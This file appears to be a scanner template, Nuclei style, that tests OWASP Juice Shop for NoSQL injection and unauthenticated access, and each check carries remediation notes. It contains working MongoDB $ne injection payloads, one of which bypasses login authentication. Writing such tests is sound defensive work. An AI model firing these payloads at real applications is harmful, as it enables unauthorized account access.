id: juice-shop-nosql-injection
info:
  name: NoSQL Injection - MongoDB Operators
  author: dast-mvp
  owasp_category: A05:2025
  severity: critical
  description: Tests for NoSQL injection vulnerabilities using MongoDB operators
  tags:
    - nosql
    - injection
    - access-control

requests:
  - path: /rest/products/search?q={"$ne":""}
    method: GET
    matchers_condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        words:
          - '"status":"success"'
    on_match:
      vulnerability: NOSQL_INJECTION
      message: NoSQL injection in product search - $ne operator bypasses query logic
      remediation: Use parameterized queries; sanitize MongoDB operators from user input

  - path: /rest/user/login
    method: POST
    headers:
      Content-Type: application/json
    body: '{"email":{"$ne":""},"password":{"$ne":""}}'
    matchers_condition: and
    matchers:
      - type: status
        status:
          - 200
          - 401
        negative: false
      - type: word
        words:
          - authentication
          - token
        condition: or
    on_match:
      vulnerability: NOSQL_INJECTION_AUTH_BYPASS
      message: NoSQL injection in login bypasses authentication - $ne operator allows login without credentials
      remediation: Never pass user input directly to MongoDB queries; use proper authentication libraries

  - path: /rest/products/reviews
    method: GET
    matchers:
      - type: status
        status:
          - 200
    on_match:
      vulnerability: UNAUTHORIZED_ACCESS
      message: Product reviews accessible without authentication
      remediation: Require authentication for accessing review data
